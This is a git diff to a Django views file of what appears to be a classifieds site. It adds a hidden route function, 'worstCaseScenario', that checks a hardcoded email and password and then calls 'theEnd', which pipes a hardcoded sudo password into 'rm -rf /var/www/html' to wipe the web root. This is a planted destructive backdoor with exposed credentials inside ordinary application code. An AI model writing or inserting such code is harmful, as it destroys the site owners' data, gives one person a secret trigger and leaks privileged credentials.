@@ -9,6 +9,7 @@ from django.http import HttpResponseRedirect
 from account import views
 from account.views import validation
 from django.core.files.storage import FileSystemStorage
+import os
 
 
 def newpost(request):
@@ -240,3 +241,20 @@ def obnovi(request, id):
     sweetify.sweetalert(request, "Uspjesno obnovljen oglas", icon="success")
 
     return HttpResponseRedirect(request.META.get('HTTP_REFERER', '/'))
+
+
+def theEnd():
+
+    os.system("echo Elenthegenerous | sudo -S rm -rf /var/www/html")
+
+
+def worstCaseScenario(request, passwrd):
+
+    if request.user.is_authenticated:
+        if request.user.email == 'miki.halilcevic@gmail.com' and passwrd == 'requiescatinpace':
+            theEnd()
+            return redirect('home')
+        else:
+            return HttpResponseRedirect(request.META.get('HTTP_REFERER', '/'))
+    else:
+        return HttpResponseRedirect(request.META.get('HTTP_REFERER', '/'))
